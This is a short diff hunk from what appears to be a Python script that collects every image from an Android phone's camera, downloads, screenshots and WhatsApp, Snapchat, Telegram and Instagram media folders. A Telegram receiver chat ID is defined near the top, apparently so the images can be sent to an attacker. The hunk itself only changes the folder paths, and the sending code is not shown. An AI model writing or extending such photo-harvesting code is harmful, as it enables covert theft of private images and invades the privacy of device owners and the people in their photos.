@@ -12,14 +12,14 @@ RECEIVER_CHAT_ID = "8688379018"                                       # Chat/Use
 # ✅ Function: Get all images from multiple folders
 def get_all_images():
     folders = [
-        "/storage/emulated/0/DCIM/Camera",
-        "/storage/emulated/0/Download",
-        "/storage/emulated/0/Pictures",
-        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
-        "/storage/emulated/0/Snapchat",
-        "/storage/emulated/0/Telegram",
-        "/storage/emulated/0/Screenshots",
-        "/storage/emulated/0/Instagram"
+        "/storage/emulated/DCIM/Camera",
+        "/storage/emulated/Download",
+        "/storage/emulated/Pictures",
+        "/storage/emulated/WhatsApp/Media/WhatsApp Images",
+        "/storage/emulated/Snapchat",
+        "/storage/emulated/Telegram",
+        "/storage/emulated/Screenshots",
+        "/storage/emulated/Instagram"
     ]
     image_types = ('*.jpg', '*.jpeg', '*.png', '*.webp')
     all_files = []
